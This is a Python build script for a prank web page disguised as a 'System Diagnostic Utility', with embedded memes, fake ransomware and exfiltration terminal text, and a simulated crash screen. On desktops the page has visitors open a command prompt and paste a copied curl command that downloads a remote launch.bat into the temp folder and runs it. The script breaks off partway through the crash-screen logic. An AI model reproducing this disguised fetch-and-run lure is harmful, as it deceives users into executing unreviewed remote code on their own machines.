#!/usr/bin/env python3
"""
build_web.py
Compiles index.html with:
1. Robust mobile device detection: iPhone, iPad, Android Phone, Android Tablet, mobile viewport
2. Full interactive Mobile In-Browser Chaos Prank:
   - Mobile cyber terminal with mobile telemetry & fake exfiltration
   - Mobile home screen takeover with app icons & dock
   - Meme cascade & touch-dodging retro virus error cards with sound & haptic vibration
   - Mobile push notification alert toast
   - Screen tearing glitch & Mobile BSOD / Kernel Panic with live panic tap counter
   - Comical failing repair ("bro we're cooked 💀") & AI Personality restore dialogue
   - Final Dignity Audit roast
   - 2411 instant abort via keyboard or discreet emergency touch button
3. Desktop experience:
   - 1-click terminal command copy box (Windows CMD & macOS/Linux Bash)
   - Optional In-Browser Simulation fallback
4. Embedded Base64 meme images so it requires ZERO external assets or server dependencies
"""

import base64
import glob
import json
import os

MEME_FILES = [
    "10 Funny Versions of Monalisa Trolling the Internet.jpg",
    "45+ Funny History Memes That Aren’t Just For History Buffs.jpg",
    "45036065019418068.jpg",
    "Can’t Believe I Almost Skipped These Historical Gems.jpg",
    "Crazy Funny Pictures.jpg",
    "Dog Meme Look.jpg",
    "Dream.jpg",
    "gif.jpg",
    "Meme Deole.jpg",
    "Meme Pfp Ideas.jpg",
    "Mr bean funny meme.jpg",
    "patrick.jpg",
    "Pitudo Meme.jpg",
    "repost.jpg",
    "Results for quiz I judge ur music taste.jpg",
    "shocked.jpg",
    "What I look like 99% of the time.jpg",
    "WHO.jpg"
]

def load_memes_base64():
    memes_data = []
    for fname in MEME_FILES:
        target_path = None
        for sdir in ["memes", "."]:
            cand = os.path.join(sdir, fname)
            if os.path.exists(cand):
                target_path = cand
                break
            pattern = os.path.join(sdir, fname.replace("’", "*").replace("'", "*"))
            matches = glob.glob(pattern)
            if matches:
                target_path = matches[0]
                break
        if target_path and os.path.exists(target_path):
            with open(target_path, "rb") as f:
                b64 = base64.b64encode(f.read()).decode("utf-8")
                memes_data.append({
                    "name": os.path.basename(target_path),
                    "data": f"data:image/jpeg;base64,{b64}",
                    "size": os.path.getsize(target_path)
                })
    return memes_data

def build():
    memes = load_memes_base64()
    print(f"Loaded {len(memes)} meme images into memory.")
    memes_json = json.dumps(memes)

    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Diagnostic Utility</title>
<style>
  * {{
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    -webkit-user-select: none;
    user-select: none;
    -webkit-touch-callout: none;
  }}
  html, body {{
    width: 100%;
    height: 100%;
    background-color: #040608;
    color: #00e650;
    font-family: Consolas, "Courier New", "Liberation Mono", monospace;
    overflow: hidden;
    position: fixed;
  }}

  /* Mobile Diagnostic Launcher Prompt */
  #mobile-launcher {{
    display: none;
    width: 100vw;
    height: 100%;
    background: #040608;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding: 24px;
    z-index: 100;
    position: absolute;
    top: 0;
    left: 0;
  }}
  .mobile-scan-card {{
    width: 100%;
    max-width: 420px;
    background: #080d09;
    border: 2px solid #00e650;
    padding: 24px 20px;
    box-shadow: 0 0 35px rgba(0, 230, 80, 0.25);
    text-align: left;
  }}
  .m-badge {{
    display: inline-block;
    background: rgba(0, 230, 80, 0.15);
    color: #00e650;
    font-size: 11px;
    font-weight: bold;
    padding: 4px 8px;
    border: 1px solid #00e650;
    margin-bottom: 14px;
    letter-spacing: 1px;
  }}
  .m-title {{
    font-size: 18px;
    font-weight: bold;
    color: #00e650;
    margin-bottom: 16px;
    border-bottom: 1px solid #1a3320;
    padding-bottom: 8px;
    text-transform: uppercase;
    letter-spacing: 1px;
  }}
  .m-row {{
    font-size: 13px;
    color: #8bb396;
    margin-bottom: 8px;
    line-height: 1.4;
  }}
  .m-ok {{ color: #00e650; font-weight: bold; }}
  .m-warn {{ color: #ffd228; font-weight: bold; }}
  .m-alert {{ color: #ff4d4d; font-weight: bold; }}

  .m-start-btn {{
    width: 100%;
    margin-top: 22px;
    background: #0f1c14;
    border: 2px solid #00e650;
    color: #00e650;
    padding: 16px 18px;
    font-family: inherit;
    font-size: 15px;
    font-weight: bold;
    cursor: pointer;
    text-align: center;
    letter-spacing: 1px;
    box-shadow: 0 0 15px rgba(0, 230, 80, 0.3);
    animation: pulseBtn 1.8s infinite;
  }}
  @keyframes pulseBtn {{
    0%, 100% {{ box-shadow: 0 0 15px rgba(0, 230, 80, 0.3); }}
    50% {{ box-shadow: 0 0 28px rgba(0, 230, 80, 0.7); background: #173020; }}
  }}
  .m-hint {{
    margin-top: 14px;
    font-size: 11px;
    color: #557760;
    line-height: 1.4;
    text-align: center;
  }}

  /* Desktop Container */
  #desktop-launcher {{
    display: none;
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 640px;
    max-width: 92%;
    background: #0a0e13;
    border: 2px solid #00e650;
    padding: 30px;
    box-shadow: 0 0 35px rgba(0, 230, 80, 0.2);
    text-align: left;
    z-index: 100;
  }}
  .dt-title {{
    font-size: 20px;
    color: #00e650;
    margin-bottom: 16px;
    border-bottom: 1px solid #1a3320;
    padding-bottom: 8px;
    text-transform: uppercase;
    letter-spacing: 1px;
  }}
  .dt-row {{
    font-size: 14px;
    color: #8bb396;
    margin-bottom: 10px;
    line-height: 1.4;
  }}
  .dt-row span.ok {{
    color: #00e650;
  }}
  .os-tabs {{
    display: flex;
    gap: 8px;
    margin-top: 16px;
    margin-bottom: 6px;
  }}
  .os-tab {{
    flex: 1;
    background: #080d0a;
    border: 1px solid #1a3320;
    color: #557760;
    padding: 8px 12px;
    font-family: inherit;
    font-size: 12px;
    font-weight: bold;
    cursor: pointer;
    text-align: center;
    transition: all 0.2s;
  }}
  .os-tab.active {{
    background: #0f1c14;
    border-color: #00e650;
    color: #00e650;
    box-shadow: 0 0 10px rgba(0, 230, 80, 0.25);
  }}
  .cmd-box {{
    background: #040608;
    border: 1px solid #1a3320;
    border-left: 3px solid #00e650;
    color: #00e650;
    font-family: Consolas, "Courier New", monospace;
    font-size: 13px;
    padding: 14px;
    margin: 10px 0 14px 0;
    line-height: 1.4;
    word-break: break-all;
    -webkit-user-select: all;
    user-select: all;
  }}
  .copy-btn {{
    width: 100%;
    background: #0f1c14;
    border: 1px solid #00e650;
    color: #00e650;
    padding: 14px 16px;
    font-family: inherit;
    font-size: 14px;
    font-weight: bold;
    cursor: pointer;
    text-align: center;
    transition: all 0.2s;
    letter-spacing: 0.5px;
  }}
  .copy-btn:hover {{
    background: #00e650;
    color: #040608;
    box-shadow: 0 0 18px rgba(0, 230, 80, 0.4);
  }}
  .cmd-hint {{
    margin-top: 14px;
    font-size: 12px;
    color: #72967b;
    line-height: 1.5;
  }}
  .cmd-hint b {{
    color: #00e650;
  }}

  /* Fullscreen Unified Canvas Container */
  #canvas-container {{
    display: none;
    width: 100vw;
    height: 100%;
    position: relative;
    background: #040608;
  }}
  #main-canvas {{
    width: 100%;
    height: 100%;
    display: block;
    touch-action: none;
  }}
  #btn-mobile-abort {{
    display: none;
    position: fixed;
    top: 10px;
    right: 10px;
    background: rgba(10, 15, 10, 0.7);
    color: rgba(0, 230, 80, 0.5);
    border: 1px solid rgba(0, 230, 80, 0.25);
    font-size: 10px;
    padding: 4px 8px;
    border-radius: 4px;
    z-index: 10000;
    font-family: monospace;
    cursor: pointer;
  }}
</style>
</head>
<body>

<!-- Mobile Diagnostic Scanner Start Prompt -->
<div id="mobile-launcher">
  <div class="mobile-scan-card">
    <div class="m-badge">● LIVE TELEMETRY</div>
    <div class="m-title">&gt; SYSTEM INTEGRITY SCAN</div>
    <div class="m-row">&gt; HARDWARE AUDIT: <span class="m-ok" id="m-device-name">[MOBILE DEVICE]</span></div>
    <div class="m-row">&gt; ENVIRONMENT: <span class="m-warn">AUDIT REQUIRED</span></div>
    <div class="m-row">&gt; THREAT STATUS: <span class="m-alert">ANALYSIS PENDING</span></div>
    
    <button id="btn-start-mobile" class="m-start-btn">
      &gt; TAP TO START DIAGNOSTIC &lt;
    </button>
    <div class="m-hint">&gt; Tap anywhere to verify hardware and display subsystem</div>
  </div>
</div>

<!-- Desktop Container (Verification / Terminal Command Display) -->
<div id="desktop-launcher">
  <div class="dt-title">&gt; SYSTEM DIAGNOSTIC FRAMEWORK</div>
  <div class="dt-row">&gt; HARDWARE AUDIT: <span class="ok">[OK] DESKTOP / LAPTOP VERIFIED</span></div>
  <div class="dt-row">&gt; ARCHITECTURE: <span class="ok">[OK] REAL TERMINAL READY</span></div>

  <!-- OS Selection Tabs -->
  <div class="os-tabs">
    <button class="os-tab active" id="tab-win">&gt; WINDOWS (CMD)</button>
    <button class="os-tab" id="tab-unix">&gt; MACOS &amp; LINUX (BASH)</button>
  </div>
  
  <div class="cmd-box" id="cmd-display">curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\\\launch.bat" &amp;&amp; "%TEMP%\\\\launch.bat"</div>

  <button class="copy-btn" id="btn-copy">&gt; CLICK TO COPY COMMAND</button>

  <div class="cmd-hint" id="cmd-hint">
    &gt; <b>Step 1:</b> Press <b>Win + R</b>, type <b>cmd</b>, and press <b>Enter</b>.<br>
    &gt; <b>Step 2:</b> Paste the command and press <b>Enter</b>.
  </div>

  <div style="margin-top: 22px; text-align: center;">
    <button id="btn-run-browser-sim" style="background: transparent; border: 1px dashed #204028; color: #558860; font-size: 11px; padding: 6px 14px; cursor: pointer; border-radius: 4px; font-family: inherit;">
      [ OR RUN IN-BROWSER SIMULATION ]
    </button>
  </div>
</div>

<!-- Canvas Container -->
<div id="canvas-container">
  <canvas id="main-canvas"></canvas>
  <button id="btn-mobile-abort" title="Emergency Abort Code">2411</button>
</div>

<script>
// Embedded meme assets
const MEME_ASSETS = {memes_json};

/* ==========================================================================
   ROBUST DEVICE DETECTION
   ========================================================================== */
function isMobileDevice() {{
  const ua = navigator.userAgent || '';
  const platform = navigator.platform || '';
  const maxTouchPoints = navigator.maxTouchPoints || 0;

  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|Silk/i.test(ua)) {{
    return true;
  }}
  if ((platform === 'MacIntel' || platform === 'Macintosh') && maxTouchPoints > 1 && !window.MSStream) {{
    return true;
  }}
  if (window.innerWidth <= 820 || (window.screen && window.screen.width <= 820)) {{
    return true;
  }}
  if (window.matchMedia && window.matchMedia("(max-width: 820px) and (hover: none)").matches) {{
    return true;
  }}
  return false;
}}

function getMobileDeviceName() {{
  const ua = navigator.userAgent || '';
  if (/iPhone/i.test(ua)) return "Apple iPhone";
  if (/iPad/i.test(ua)) return "Apple iPad";
  if (/Android/i.test(ua)) {{
    const match = ua.match(/Android\\s+([0-9\\.]+);\\s*([^;)]+)/i);
    if (match && match[2]) return match[2].trim();
    return "Android Device";
  }}
  return "Mobile Device";
}}

/* ==========================================================================
   PROCEDURAL WEB AUDIO SYNTHESIZER
   ========================================================================== */
class WebSFX {{
  constructor() {{
    this.ctx = null;
  }}
  init() {{
    if (!this.ctx) {{
      const AudioCtx = window.AudioContext || window.webkitAudioContext;
      this.ctx = new AudioCtx();
    }}
    if (this.ctx && this.ctx.state === "suspended") {{
      this.ctx.resume();
    }}
  }}
  playTone(freq, durationMs, type = "sine", vol = 0.3) {{
    if (!this.ctx) return;
    try {{
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      osc.type = type;
      osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
      gain.gain.setValueAtTime(vol, this.ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, this.ctx.currentTime + durationMs / 1000);
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      osc.start();
      osc.stop(this.ctx.currentTime + durationMs / 1000);
    }} catch (e) {{}}
  }}
  blip() {{ this.playTone(1200, 40, "sine", 0.15); }}
  pop() {{
    const freqs = [392, 523, 659, 880];
    const f = freqs[Math.floor(Math.random() * freqs.length)];
    this.playTone(f, 80, "triangle", 0.35);
  }}
  glitch() {{
    const f = 80 + Math.random() * 200;
    this.playTone(f, 60, "sawtooth", 0.4);
  }}
  warn() {{ this.playTone(150, 420, "sawtooth", 0.5); }}
  success() {{ this.playTone(880, 260, "sine", 0.4); }}
  dodge() {{
    const f = 1400 + Math.random() * 450;
    this.playTone(f, 50, "sine", 0.35);
  }}
  winError() {{
    this.playTone(180, 480, "sawtooth", 0.6);
  }}
}}

/* ==========================================================================
   UNIFIED IN-BROWSER CHAOS ENGINE (MOBILE & DESKTOP)
   ========================================================================== */
class WebChaosPrank {{
  constructor(canvas, sfx, isMobile = false, deviceLabel = "VICTIM_CLIENT") {{
    this.canvas = canvas;
    this.ctx = canvas.getContext("2d");
    this.sfx = sfx;
    this.isMobile = isMobile;
    this.deviceLabel = deviceLabel;
    this.images = [];
    this.sprites = [];
    this.state = "INIT";
    this.codeBuf = "";
    this.exitCode = "2411";
    this.loadedImagesCount = 0;
    this.W = window.innerWidth;
    this.H = window.innerHeight;
    this.totalDeployed = 0;
    this.filledPrimary = 0;
    this.mouseX = -999;
    this.mouseY = -999;
    this.panicCount = 0;
    this.shakeUntil = 0;
    this.bsodStart = 0;
    this.glitchStart = 0;
    this.repairStart = 0;
    this.toastActive = false;
    this.toastDenied = false;

    this.resize();
    window.addEventListener("resize", () => this.resize());
    window.addEventListener("keydown", (e) => this.onKey(e));
    window.addEventListener("mousemove", (e) => {{
      this.mouseX = e.clientX;
      this.mouseY = e.clientY;
    }});
    
    // Touch handlers for mobile
    const onTouch = (e) => {{
      if (e.touches && e.touches.length > 0) {{
        this.mouseX = e.touches[0].clientX;
        this.mouseY = e.touches[0].clientY;
        if (this.sfx) this.sfx.init();
        if (this.state === "BSOD" || this.state === "STARTUP_REPAIR") {{
          this.panicCount++;
          if (navigator.vibrate) {{ try {{ navigator.vibrate(50); }} catch(err){{}} }}
        }}
        if (this.sprites) {{
          this.sprites.forEach(s => {{
            if (s.checkDodge && s.checkDodge(this.mouseX, this.mouseY, this.W, this.H, this.sfx)) {{
              this.shakeUntil = performance.now() + 80;
              if (navigator.vibrate) {{ try {{ navigator.vibrate(60); }} catch(err){{}} }}
            }}
          }});
        }}
      }}
    }};
    this.canvas.addEventListener("touchstart", onTouch, {{ passive: true }});
    this.canvas.addEventListener("touchmove", onTouch, {{ passive: true }});
    this.canvas.addEventListener("click", () => {{
      if (this.state === "BSOD" || this.state === "STARTUP_REPAIR") {{
        this.panicCount++;
      }}
    }});
  }}

  resize() {{
    this.W = this.canvas.width = window.innerWidth;
    this.H = this.canvas.height = window.innerHeight;
  }}

  onKey(e) {{
    let digit = null;
    if (e.key >= '0' && e.key <= '9') {{
      digit = e.key;
    }} else if (e.code && e.code.startsWith('Digit') && e.code.length === 6) {{
      digit = e.code.charAt(5);
    }} else if (e.code && e.code.startsWith('Numpad') && e.code.length === 7) {{
      digit = e.code.charAt(6);
    }}
    if (digit) {{
      this.codeBuf = (this.codeBuf + digit).slice(-4);
      if (this.codeBuf === this.exitCode) {{
        this.triggerEmergencyExit();
        return;
      }}
    }}
    if (this.state === "BSOD") {{
      this.panicCount++;
    }}
  }}

  triggerEmergencyExit() {{
    this.state = "CLEANUP";
    this.sprites = [];
    this.cleanupIdx = 0;
    this.cleanupTimer = 0;
  }}

  start() {{
    this.sfx.init();
    // Preload image elements
    MEME_ASSETS.forEach(item => {{
      const img = new Image();
      img.onload = () => {{
        this.images.push(img);
        this.loadedImagesCount++;
      }};
      img.src = item.data;
    }});

    this.state = "BOOT";
    
    if (this.isMobile) {{
      this.bootLines = [
        "INITIALIZING MOBILE TELEMETRY...",
        "CONNECTING TO CELLULAR SUBSYSTEM...",
        "",
        "[OK]  MOBILE HARDWARE DETECTED",
        "[OK]  TOUCH INTERFACE COMPROMISED",
        "[OK]  VICTIM LOCATED",
        "",
        "============================================================",
        `[+] DEVICE IDENTIFIED: "${{this.deviceLabel}}"`,
        "[+] SECURITY PATCH: OUTDATED (EMBARRASSING)",
        "[+] POWER / BATTERY: 14% [DRAINING RAPIDLY]",
        "[+] STORAGE: 99.8% FULL (14,219 UNNECESSARY SCREENSHOTS)",
        "============================================================",
        "",
        "[PRIVILEGE] Current user status: MOBILE GUEST",
        "[PRIVILEGE] Escalating to: ROOT / KERNEL... OK",
        "[PRIVILEGE] Escalating to: SUPREME OVERLORD OF THIS PHONE... GRANTED",
        "",
        "[CAMERA] Initializing front optical selfie sensor...",
        "[CAMERA] Human face detected in front of screen.",
        "[CAMERA] Expression: VISIBLY SWEATING & CONFUSED 💀",
        "[CAMERA] Status: NOT ACTUALLY ACCESSING CAMERA. CHILL.",
        "",
        "Scanning mobile storage for exfiltration...",
        "  |████████████████████| 100%",
        "",
        "Targeting personal directories for exfiltration...",
        "[EXFILTRATE] /DCIM/Camera/embarrassing_selfie_01.jpg ..... [UPLOADED]",
        "[EXFILTRATE] /WhatsApp/chat_history_archive.db .......... [EXTRACTED]",
        "[EXFILTRATE] /Notes/passwords_dont_open_serious.txt ..... [HELD HOSTAGE]",
        "[EXFILTRATE] /Safari/Browsing_History_3AM.db ........... [LEAKED]",
        "",
        "============================================================",
        "ALL YOUR MOBILE DATA HAS BEEN ENCRYPTED (AES-9000).",
        "SEND 500 DOGECOIN TO PREVENT AUTO-SHARING TO YOUR CONTACTS.",
        "...",
        "JUST KIDDING. WE DON'T TOUCH YOUR FILES. 😭 BUT YOU LOOKED WORRIED.",
        "============================================================",
        "",
        "[SECURITY] Mobile Security & Play Protect: DETECTED",
        "[SECURITY] Deploying weaponized memes against mobile defense...",
        "[SECURITY] Mobile Security: CONFUSED & CRYING",
        "[SECURITY] Security status: SURRENDERED TO MEMES",
        "",
        "[OPERATOR] Remote mobile terminal connected.",
        "[OPERATOR] > sudo rm -rf / ... wait how do i type on touchscreen",
        "[OPERATOR] > sorry first day at the ransomware syndicate",
        "[ERROR] Remote operator is typing with one thumb.",
        "",
        "[BEHAVIOR] Monitoring touchscreen pressure & heart rate...",
        "[BEHAVIOR] Panic level: 37%",
        "[BEHAVIOR] Panic level: 64%",
        "[BEHAVIOR] Panic level: [███████████████] 97%",
        "[BEHAVIOR] Resistance level: EMBARRASSING",
        "",
        "[OK]  MEME STAGING DATABASE ARMED",
        "",
        "Preparing mobile payload..."
      ];
    }} else {{
      this.bootLines = [
        "CONNECTING........",
        "CONNECTING...............",
        "",
        "ACCESSING DISPLAY......",
        "",
        "[OK]  DISPLAY FOUND",
        "[OK]  ADMINISTRATOR ACCESS GRANTED",
        "[OK]  VICTIM LOCATED",
        "",
        "============================================================",
        `[+] TARGET USER IDENTIFIED: "P_KAULANI"`,
        `[+] WORKSTATION: "${{this.deviceLabel}}" (Windows 11 Pro 64-bit)`,
        "[+] CPU ARCHITECTURE: AMD Ryzen 9 7950X (OVERHEATING - 94°C)",
        "[+] INTERNAL NETWORK: 192.168.0.███ | MAC: 00:1A:2B:3C:██:██",
        "[+] POWER / BATTERY: 4% [PLUG IN IMMEDIATELY OR DIE]",
        "============================================================",
        "",
        "[PRIVILEGE] Current user status: GUEST / PEASANT",
        "[PRIVILEGE] Escalating to: ADMINISTRATOR... OK",
        "[PRIVILEGE] Escalating to: SYSTEM NT AUTHORITY... OK",
        "[PRIVILEGE] Escalating to: SUPREME OVERLORD OF THIS LAPTOP... GRANTED",
        "",
        "[CAMERA] Initializing front optical sensor...",
        "[CAMERA] Human face detected in front of screen.",
        "[CAMERA] Expression: VISIBLY SWEATING & CONFUSED 💀",
        "[CAMERA] Status: NOT ACTUALLY ACCESSING CAMERA. CHILL.",
        "",
        "Scanning system files...",
        "  |████████████████████| 100%",
        "",
        "Targeting user directories for exfiltration...",
        "[EXFILTRATE] C:\\Users\\Target\\Desktop\\Final_Project_v2_FINAL.docx .. [ENCRYPTED]",
        "[EXFILTRATE] C:\\Users\\Target\\Documents\\passwords_dont_open.txt ... [HELD HOSTAGE]",
        "[EXFILTRATE] C:\\Users\\Target\\Pictures\\childhood_photo.png ....... [UPLOADING]",
        "[EXFILTRATE] C:\\Users\\Target\\AppData\\Browsing_History_3AM.db ... [EXTRACTED]",
        "",
        "============================================================",
        "ALL YOUR FILES HAVE BEEN ENCRYPTED (AES-9000).",
        "SEND 500 DOGECOIN TO WALLET: 0xDEAD...BEEF",
        "...",
        "JUST KIDDING. WE DON'T TOUCH YOUR FILES. 😭 BUT YOU LOOKED WORRIED.",
        "============================================================",
        "",
        "[AV_BATTLE] Windows Defender: DETECTED",
        "[AV_BATTLE] Deploying weaponized memes against antivirus...",
        "[AV_BATTLE] Windows Defender: CONFUSED",
        "[AV_BATTLE] System Firewall: EMOTIONALLY UNAVAILABLE",
        "[AV_BATTLE] Third-party Antivirus: CRYING IN A CORNER",
        "[AV_BATTLE] Security status: SURRENDERED",
        "",
        "[OPERATOR] Remote terminal session established.",
        "[OPERATOR] > cd system32",
        "[OPERATOR] > rm -rf /* ... wait wrong operating system",
        "[OPERATOR] > what button do I click guys",
        "[OPERATOR] > sorry first day at the ransomware syndicate",
        "[ERROR] Remote operator appears to be an intern.",
        "",
        "[BEHAVIOR] Monitoring user input and keyboard pressure...",
        "[BEHAVIOR] Panic level: 37%",
        "[BEHAVIOR] Panic level: 64%",
        "[BEHAVIOR] Panic level: [███████████████] 97%",
        "[BEHAVIOR] Psychological resistance detected.",
        "[BEHAVIOR] Resistance level: EMBARRASSING",
        "",
        "[OK]  MEME STAGING DATABASE ARMED",
        "",
        "Preparing payload..."
      ];
    }}

    this.bootIdx = 0;
    this.bootChar = 0;
    this.bootTimer = 0;
    this.revealedLines = [];
    this.lastTime = performance.now();
    requestAnimationFrame((t) => this.loop(t));
  }}

  loop(currentTime) {{
    const dt = Math.min((currentTime - this.lastTime) / 1000, 0.05);
    this.lastTime = currentTime;

    this.update(dt);
    this.render();

    if (this.state !== "DONE") {{
      requestAnimationFrame((t) => this.loop(t));
    }}
  }}

  initGrid() {{
    const COLS = this.isMobile ? 2 : 5;
    const ROWS = this.isMobile ? 5 : 4;
    const cellW = this.W / COLS;
    const cellH = this.H / ROWS;
    this.gridSlots = [];
    for (let r = 0; r < ROWS; r++) {{
      for (let c = 0; c < COLS; c++) {{
        this.gridSlots.push({{
          cx: c * cellW + cellW / 2,
          cy: r * cellH + cellH / 2
        }});
      }}
    }}
    this.gridSlots.sort(() => Math.random() - 0.5);
    this.totalPrimary = this.gridSlots.length;
    this.spawnTimer = 0;
    this.spawnIv = this.isMobile ? 0.9 : 1.35;
    this.overloadTimer = 0;
  }}

  spawnVirusItem() {{
    const neonCols = ["#ff007f", "#00e5ff", "#39ff14", "#ffe600", "#ff6600", "#bf00ff"];
    const titles = ["MEME_PAYLOAD.EXE", "VIRUS_BRAINROT.VBS", "DOGE_OVERLOAD.SYS", "CHAOS_OVERFLOW.DLL", "LOL_INFECTION.BAT"];
    const errors = [
      {{ t: "Critical System Alert", m: "CRITICAL ERROR 0x80004005:\nToo many memes in memory buffer.", c: "#cc0000", i: "X" }},
      {{ t: "Fatal Exception", m: "FATAL EXCEPTION at 0xDEADBEEF:\nVictim heartbeat elevated.", c: "#cc0000", i: "X" }},
      {{ t: "Security Alert", m: "VIRUS WARNING: 'Brainrot.Gen'\nContainment protocol failed completely.", c: "#e68a00", i: "!" }},
      {{ t: "Memory Allocation Error", m: "OUT OF MEMORY:\nMeme density exceeded 9000 terabytes.", c: "#e68a00", i: "!" }},
      {{ t: "Application Hang", m: "System is laughing too hard.\nChaosEngine has crashed into memes.", c: "#0055aa", i: "i" }},
      {{ t: "Security Breach", m: "ALERT: Administrator privileges granted\nto uncontrollable meme entities.", c: "#990099", i: "!" }},
      {{ t: "System Failure", m: "ERROR 404: Common Sense Not Found.\nPlease restart victim.", c: "#cc0000", i: "X" }}
    ];

    let cx, cy;
    if (this.gridSlots && this.gridSlots.length > 0) {{
      const slot = this.gridSlots.pop();
      cx = slot.cx + (Math.random() - 0.5) * (this.isMobile ? 18 : 30);
      cy = slot.cy + (Math.random() - 0.5) * (this.isMobile ? 16 : 25);
      this.filledPrimary++;
    }} else {{
      cx = 0.12 * this.W + Math.random() * 0.76 * this.W;
      cy = 0.12 * this.H + Math.random() * 0.76 * this.H;
    }}

    const isMeme = Math.random() < 0.65 && this.images.length > 0;
    const baseW = this.isMobile ? Math.min(this.W * 0.84, 280) : (isMeme ? 320 : 340);
    const baseH = this.isMobile ? Math.min(this.H * 0.25, 190) : (isMeme ? 240 : 145);

    const item = {{
      isMeme: isMeme,
      img: isMeme ? this.images[Math.floor(Math.random() * this.images.length)] : null,
      errorData: isMeme ? null : errors[Math.floor(Math.random() * errors.length)],
      neonColor: neonCols[Math.floor(Math.random() * neonCols.length)],
      title: titles[Math.floor(Math.random() * titles.length)],
      cx: cx,
      cy: cy,
      w: baseW,
      h: baseH,
      scale: 0.01,
      phase: "grow",
      phaseT: 0,
      dead: false,
      dodgeCooldown: 0,
      checkDodge: function(mx, my, W, H, sfx) {{
        if (this.isMeme || this.scale < 0.75 || this.phase === "leave") return false;
        if (this.dodgeCooldown > 0) return false;
        const btnY = this.cy + (this.h / 2) - 20;
        const dx = mx - this.cx;
        const dy = my - btnY;
        const dist = Math.hypot(dx, dy);
        if (dist < 65) {{
          this.cx = 0.16 * W + Math.random() * 0.68 * W;
          this.cy = 0.16 * H + Math.random() * 0.68 * H;
          this.dodgeCooldown = 0.4;
          sfx.dodge();
          return true;
        }}
        return false;
      }},
      forceLeave: function() {{
        this.phase = "leave";
        this.phaseT = 0;
      }}
    }};

    this.sprites.push(item);
    this.totalDeployed++;
    this.shakeUntil = performance.now() + 80;
    if (isMeme) this.sfx.pop();
    else this.sfx.glitch();
    if (this.isMobile && navigator.vibrate) {{
      try {{ navigator.vibrate(40); }} catch(e) {{}}
    }}
  }}

  update(dt) {{
    if (this.sprites) {{
      this.sprites.forEach(s => {{
        if (s.dodgeCooldown > 0) s.dodgeCooldown -= dt;
      }});
    }}

    // 1. BOOT SEQUENCE
    if (this.state === "BOOT") {{
      this.bootTimer += dt;
      const stepDelay = this.isMobile ? 0.045 : 0.065;
      if (this.bootTimer >= stepDelay) {{
        this.bootTimer = 0;
        if (this.bootIdx < this.bootLines.length) {{
          const line = this.bootLines[this.bootIdx];
          this.bootChar++;
          if (this.bootChar >= line.length) {{
            this.revealedLines.push(line);
            this.bootIdx++;
            this.bootChar = 0;
          }}
        }} else {{
          this.state = "DOWNLOADING";
          this.dlIdx = 0;
          this.dlProg = 0;
          this.dlTimer = 0;
        }}
      }}
    }}

    // 2. LIVE MEME DOWNLOADING PHASE
    else if (this.state === "DOWNLOADING") {{
      this.dlTimer += dt;
      if (this.dlIdx < MEME_ASSETS.length) {{
        this.dlProg += dt * 1.8;
        if (this.dlProg >= 1.0) {{
          this.dlProg = 0;
          const m = MEME_ASSETS[this.dlIdx];
          const kb = Math.round(m.size / 1024);
          const nameTrim = this.isMobile ? m.name.substring(0, 24) : m.name;
          this.revealedLines.push(`[DOWNLOAD] ${{nameTrim.padEnd(this.isMobile ? 26 : 42, ' ')}} [████████████████████] 100% (${{kb}} KB)`);
          this.dlIdx++;
          this.sfx.blip();
        }}
      }} else {{
        this.revealedLines.push("");
        this.revealedLines.push("[OK] ALL MEME ASSETS DOWNLOADED AND LOADED");
        this.revealedLines.push("");
        this.revealedLines.push("Attempting containment... FAILED");
        this.revealedLines.push("UNAUTHORIZED MEME ACTIVITY DETECTED");
        this.revealedLines.push("Minimizing terminal & deploying virus payload in 10... 7... 3... 47...");
        this.revealedLines.push("WE CHANGED OUR MIND.");
        this.revealedLines.push("Just kidding: 5.. 4.. 3.. 2.. 1.. LOL");
        this.sfx.warn();
        if (navigator.vibrate) {{ try {{ navigator.vibrate([100, 50, 100]); }} catch(e){{}} }}
        this.state = "TILING_GAPS";
        this.initGrid();
      }}
    }}

    // 3. TILING GAPS
    else if (this.state === "TILING_GAPS") {{
      this.spawnTimer += dt;
      if (this.spawnTimer >= this.spawnIv) {{
        this.spawnTimer = 0;
        if (this.gridSlots.length > 0) {{
          this.spawnVirusItem();
          this.spawnIv = Math.max(this.isMobile ? 0.45 : 0.55, this.spawnIv * 0.95);
        }} else {{
          this.state = "CASCADE_SATURATION";
          this.cascadeTimer = 0;
          this.sfx.warn();
        }}
      }}
      this.updateSprites(dt);
      this.sprites.forEach(s => {{
        if (s.checkDodge && s.checkDodge(this.mouseX, this.mouseY, this.W, this.H, this.sfx)) {{
          this.shakeUntil = performance.now() + 80;
        }}
      }});
    }}

    // 4. CASCADE SATURATION
    else if (this.state === "CASCADE_SATURATION") {{
      this.spawnTimer += dt;
      this.cascadeTimer += dt;
      if (this.cascadeTimer >= 1.2 && !this.toastActive) {{
        this.toastActive = true;
        this.sfx.winError();
        if (navigator.vibrate) {{ try {{ navigator.vibrate(120); }} catch(e){{}} }}
      }}
      const fastRate = this.isMobile ? 0.18 : 0.22;
      if (this.spawnTimer >= fastRate) {{
        this.spawnTimer = 0;
        this.spawnVirusItem();
      }}
      this.updateSprites(dt);
      this.sprites.forEach(s => {{
        if (s.checkDodge && s.checkDodge(this.mouseX, this.mouseY, this.W, this.H, this.sfx)) {{
          this.shakeUntil = performance.now() + 80;
        }}
      }});
      if (this.cascadeTimer >= 8.5) {{
        this.state = "GLITCH";
        this.glitchStart = performance.now();
        this.sfx.winError();
        if (navigator.vibrate) {{ try {{ navigator.vibrate([150, 50, 150, 50, 200]); }} catch(e){{}} }}
      }}
    }}

    // 5. GLITCH
    else if (this.state === "GLITCH") {{
      const elapsed = (performance.now() - this.glitchStart) / 1000;
      if (elapsed >= 1.4) {{
        this.state = "BSOD";
        this.bsodStart = performance.now();
        this.panicCount = 0;
        this.sfx.winError();
      }}
    }}

    // 6. BSOD / KERNEL PANIC
